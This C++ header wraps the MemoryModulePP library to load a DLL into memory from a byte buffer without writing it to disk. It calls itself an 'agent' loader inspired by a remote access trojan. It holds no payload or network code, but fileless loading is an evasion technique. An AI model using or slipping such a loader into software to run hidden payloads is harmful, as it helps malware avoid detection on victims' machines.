// memory_loader.h - Agent DLL memory loader (inspired by zzrat MEMORYLOAD).
// Uses MemoryModulePP to load a PE image from a raw byte buffer without writing
// to disk. Compile with -DMEMORYLOAD to enable; otherwise falls back to a stub.
#pragma once
#include <cstdint>
#include <cstddef>
#include <string>

#ifdef MEMORYLOAD
#include "MemoryModulePP.h"

namespace MemoryLoader {
    inline void* Load(const void* data, size_t size) {
        return (void*)MemoryLoadLibrary(data, size);
    }
    inline void* GetProc(void* mod, const char* name) {
        return (void*)MemoryGetProcAddress((PMEMORYMODULE)mod, name);
    }
    inline void Free(void* mod) {
        if (mod) MemoryFreeLibrary((PMEMORYMODULE)mod);
    }
    inline int CallEntry(void* mod) {
        return MemoryCallEntryPoint((PMEMORYMODULE)mod);
    }
}

#else
// Stub: memory loading disabled, returns null.
namespace MemoryLoader {
    inline void* Load(const void*, size_t) { return nullptr; }
    inline void* GetProc(void*, const char*) { return nullptr; }
    inline void  Free(void*) {}
    inline int   CallEntry(void*) { return 0; }
}
#endif
